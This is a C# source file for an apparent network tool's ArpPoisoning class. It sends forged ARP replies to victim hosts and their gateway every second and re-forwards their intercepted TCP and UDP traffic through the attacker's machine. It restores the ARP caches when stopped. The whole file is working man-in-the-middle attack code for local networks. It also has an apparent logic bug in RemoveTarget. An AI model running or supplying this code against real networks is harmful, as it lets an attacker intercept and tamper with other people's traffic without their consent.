using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using DipW.Classes.Components;
using DipW.Classes;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Core.Extensions;
using System.Net.NetworkInformation;
using PcapDotNet.Packets.Transport;
using DipW.Classes.Extensions;

namespace DipW.Classes.Manipulators
{
    public class ArpPoisoning
    {
        private LivePacketDevice _device;
        private BackgroundWorker _bgWorker;

        private List<Target> _targets;
        private Target _gateway;
        private MacAddress _ownMacAddr;

        private Listener.Listener _forwardingListener;

        public BackgroundWorker BgWorker
        {
            get { return _bgWorker; }
        }

        //constructors
        public ArpPoisoning(LivePacketDevice device, Target Gateway)
        {
            _device = device;
            _bgWorker = new BackgroundWorker();
            _bgWorker.WorkerSupportsCancellation = true;
            _bgWorker.DoWork += new DoWorkEventHandler(DoWork);
            _targets = new List<Target>();
            _gateway = Gateway;
            _ownMacAddr = _device.GetMacAddress();
            _forwardingListener = new Listener.Listener(device, "ip and ( udp or tcp) and ether dst " + _ownMacAddr.ToString() +
                " and not host " + _device.getIpV4Address().Address.ToString());
            _forwardingListener.StartCapture(HandlePacket);
        }

        public void HandlePacket(Packet packet)
        {
            //var ip = packet.Ethernet.IpV4;
            using (PacketCommunicator communicator = _forwardingListener.Device.Open())
            {

                var etherpacket = packet.Ethernet;
                var ippacket = etherpacket.IpV4;

                PayloadLayer payloadLayer;
                PacketBuilder builder;

                MacAddress newMacDestination;
                String ipDestination = ippacket.Destination.ToString();
                try
                {
                    newMacDestination = new MacAddress(_targets.First(x => x.IP == ipDestination).MAC);
                }
                catch
                {
                    newMacDestination = new MacAddress(_gateway.MAC);
                }


                EthernetLayer ethernetLayer =
                    new EthernetLayer
                    {
                        Source = etherpacket.Destination,
                        Destination = newMacDestination,
                        EtherType = EthernetType.IpV4,
                    };

                IpV4Layer ipLayer =
                    new IpV4Layer
                    {
                        Source = ippacket.Source,
                        CurrentDestination = ippacket.Destination,
                        Fragmentation = ippacket.Fragmentation,
                        Identification = ippacket.Identification,
                        Options = ippacket.Options,
                        HeaderChecksum = null, // Will be filled automatically.
                        Ttl = ippacket.Ttl,
                        TypeOfService = ippacket.TypeOfService,
                    };

                switch (ippacket.Protocol)
                {
                    case IpV4Protocol.Udp:
                        var updPacket = ippacket.Udp;
                        UdpLayer udpLayer = new UdpLayer
                        {
                            SourcePort = updPacket.SourcePort,
                            DestinationPort = updPacket.DestinationPort,
                            Checksum = null, // Will be filled automatically.
                            CalculateChecksumValue = true
                        };
                        payloadLayer = new PayloadLayer
                        {
                            Data = updPacket.Payload
                        };
                        builder = new PacketBuilder(ethernetLayer, ipLayer, udpLayer, payloadLayer);
                        break;

                    case IpV4Protocol.Tcp:
                        var tcpPacket = ippacket.Tcp;
                        TcpLayer tcpLayer = new TcpLayer
                        {
                            SourcePort = tcpPacket.SourcePort,
                            DestinationPort = tcpPacket.DestinationPort,
                            Checksum = null, // Will be filled automatically.
                            AcknowledgmentNumber = tcpPacket.AcknowledgmentNumber,
                            ControlBits = tcpPacket.ControlBits,
                            Window = tcpPacket.Window,
                            UrgentPointer = tcpPacket.UrgentPointer,
                            Options = tcpPacket.Options,
                            SequenceNumber = tcpPacket.SequenceNumber
                        };

                        payloadLayer = new PayloadLayer()
                        {
                            Data = tcpPacket.Payload
                        };
                        builder = new PacketBuilder(ethernetLayer, ipLayer, tcpLayer, payloadLayer);
                        break;

                    default:
                        Console.WriteLine("packet type was not udp or tcp!");
                        return;
                }

                communicator.SendPacket(builder.Build(DateTime.Now));
            }
        }

        public void AddTarget(Target target)
        {
            lock (_targets)
            {
                if (!_targets.Contains(target))
                    _targets.Add(target);
            }
        }

        public void RemoveTarget(Target target)
        {
            lock (_targets)
            {
                if (!_targets.Contains(target))
                {
                    _targets.Remove(target);
                    if (_targets.Count == 0 && _bgWorker.IsBusy)
                    {
                        _bgWorker.CancelAsync();
                    }
                }
            }
        }

        public void StartSpoofing()
        {
            if (!_bgWorker.IsBusy)
            {

                _bgWorker.RunWorkerAsync();
            }
        }

        private void DoWork(object sender, DoWorkEventArgs e)
        {
            using (PacketCommunicator communicator = _device.Open())
            {
                //add static arp-entry for gateway
                StaticARP.AddEntry(_gateway.IP, _gateway.PMAC, _device.GetNetworkInterface().Name);

                while (!_bgWorker.CancellationPending)
                {
                    foreach (var target in _targets)
                    {
                        communicator.SendPacket(BuildPoisonArpPacketReply(target, _gateway)); //Packet which gets send to the victim
                        communicator.SendPacket(BuildPoisonArpPacketReply(_gateway, target)); //Packet which gets send to the gateway
                    }

                    Thread.Sleep(1000);
                }

                //antidote
                foreach (var target in _targets)
                {
                    communicator.SendPacket(BuildAntidoteArpPacketReply(target, _gateway));
                    communicator.SendPacket(BuildAntidoteArpPacketReply(_gateway, target));
                }

                //remove static arp-entry for gateway
                StaticARP.RemoveEntry(_gateway.IP, _gateway.PMAC, _device.GetNetworkInterface().Name);
            }
        }

        private Packet BuildPoisonArpPacketReply(Target PacketTarget, Target TargetToSpoof)
        {
            return BuildArpPacketReply(new IpV4Address(PacketTarget.IP), new MacAddress(PacketTarget.MAC), new IpV4Address(TargetToSpoof.IP), _ownMacAddr);
        }

        private Packet BuildAntidoteArpPacketReply(Target PacketTarget, Target AntidoteSignature)
        {
            return BuildArpPacketReply(new IpV4Address(PacketTarget.IP), new MacAddress(PacketTarget.MAC), new IpV4Address(AntidoteSignature.IP), new MacAddress(AntidoteSignature.MAC));
        }

        private Packet BuildArpPacketReply(IpV4Address victimIp, MacAddress victimMac, IpV4Address ipToSpoof, MacAddress newSourceMac)
        {
            EthernetLayer ethernetLayer = new EthernetLayer
            {
                Source = newSourceMac,
                Destination = victimMac,
                EtherType = EthernetType.None // Will be filled automatically
            };

            ArpLayer arpLayer = new ArpLayer
            {
                ProtocolType = EthernetType.IpV4,
                Operation = ArpOperation.Reply,
                SenderHardwareAddress = Helper.MacAddressToBytes(newSourceMac),
                SenderProtocolAddress = Helper.IpAddressToBytes(ipToSpoof),
                TargetHardwareAddress = Helper.MacAddressToBytes(victimMac),
                TargetProtocolAddress = Helper.IpAddressToBytes(victimIp)
            };

            PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);

            return builder.Build(DateTime.Now);
        }


    }
}
